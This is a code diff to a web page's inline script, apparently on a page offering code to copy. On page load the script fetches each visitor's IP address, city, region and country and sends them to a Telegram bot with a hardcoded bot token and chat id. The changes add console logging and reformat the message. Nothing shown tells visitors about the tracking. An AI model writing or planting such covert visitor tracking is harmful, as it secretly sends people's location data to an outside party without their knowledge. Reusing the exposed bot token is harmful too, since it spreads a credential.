@@ -150,7 +150,11 @@
 
 <script>
 function sendTelegramMessage(data) {
-    const message = `Visitor Info: ${JSON.stringify(data)}`;
+    // Debug to see if data is being captured correctly
+    console.log("User info: ", data);
+
+    // Craft the message and URL
+        const message = `Visitor Info: IP - ${data.ip_address}, City - ${data.city}, Region - ${data.region}, Country - ${data.country}`;
     const url = `https://api.telegram.org/bot6864161221:AAH_dTN3MJrcQ2SZ9vfCsyMArTJoIlANQ2g/sendMessage?chat_id=6107520820&text=${encodeURIComponent(message)}`;
 
     // Send the request
@@ -168,11 +172,11 @@ function sendTelegramMessage(data) {
         });
 }
 
-// Get user info and send Telegram message
+// Trigger fetching user info and sending the message when the page loads
 UserInfo.getInfo(function(data) {
     sendTelegramMessage(data);
 }, function(err) {
-    console.error('Error fetching user info: ', err);
+    console.error("Error getting user info:", err);
 });
 
 function copyCode() {
